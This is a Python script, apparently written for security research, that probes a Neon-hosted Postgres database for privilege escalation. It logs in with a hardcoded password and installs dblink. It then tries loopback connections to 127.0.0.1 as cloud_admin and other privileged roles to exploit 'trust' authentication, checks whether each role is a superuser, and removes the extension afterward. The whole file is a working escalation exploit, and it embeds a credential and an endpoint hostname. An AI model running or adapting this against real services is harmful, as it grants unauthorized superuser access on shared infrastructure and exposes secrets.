# -*- coding: utf-8 -*-
"""决定性重测:用户(neondb_owner)上下文 dblink 带密码直连 127.0.0.1 cloud_admin
d13 结论与 dblink 防继承机制预期矛盾(pwd 提供后客户端检查通过+服务器 trust)
若 OK => 免提权 cloud_admin(同 trust 根因,但独立于 #3992341 的 definer 链)
零破坏:装 dblink -> 测 -> DROP"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:400]

print('create dblink:', q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False))

def probe(connstr, label):
    q("SELECT dblink_disconnect('k')", fetch=False)
    r = q("SELECT dblink_connect('k', '%s')" % connstr.replace("'", "''"))
    if isinstance(r, str) and r.startswith('ERR'):
        print('%-45s CONNECT-FAIL: %s' % (label, r[:250]))
        return
    r2 = q("SELECT * FROM dblink('k', 'SELECT current_user, session_user, (SELECT rolsuper FROM pg_roles WHERE rolname=current_user)') AS t(u text, s text, su bool)")
    print('%-45s CONNECT-OK: %s' % (label, r2))
    q("SELECT dblink_disconnect('k')", fetch=False)

print('\n=== 用户上下文直连矩阵 ===')
probe("host=127.0.0.1 port=5432 user=cloud_admin dbname=postgres connect_timeout=5", 'A no-pass')
probe("host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=5", 'B pwd=x')
probe("host=127.0.0.1 port=5432 user=cloud_admin password=npg_cI5ynlaAqjU2 dbname=postgres connect_timeout=5", 'C pwd=real')
probe("host=127.0.0.1 port=5432 user=neon_superuser password=x dbname=postgres connect_timeout=5", 'D neon_superuser pwd=x')
probe("host=127.0.0.1 port=5432 user=neon_auth password=x dbname=postgres connect_timeout=5", 'E neon_auth pwd=x')
probe("host=127.0.0.1 port=5432 user=neondb_owner password=npg_cI5ynlaAqjU2 dbname=postgres connect_timeout=5", 'F self pwd(对照)')

print('\n=== 对照:外部主机(同连接串但经代理,服务器端视角不同) ===')
probe("host=ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=8 sslmode=disable", 'G 外部5432 cloud_admin pwd=x')

print('\n=== 127.0.0.1 其他用户枚举(探测 pg_hba 覆盖面) ===')
for u in ('postgres', 'authenticator', 'anonymous', 'authenticated', 'neon_service'):
    probe("host=127.0.0.1 port=5432 user=%s password=x dbname=postgres connect_timeout=5" % u, '127 %s pwd=x' % u)

print('\n=== 结果解读 ===')
print('若 B/C 成功=trust 覆盖 cloud_admin 于任何调用者;若仅 #3992341 上下文成功=服务器端无差别,差异在 dblink 客户端检查')

q('DROP EXTENSION IF EXISTS dblink', fetch=False)
print('\ndblink dropped; final ext:', q("SELECT extname FROM pg_extension"))
conn.close()
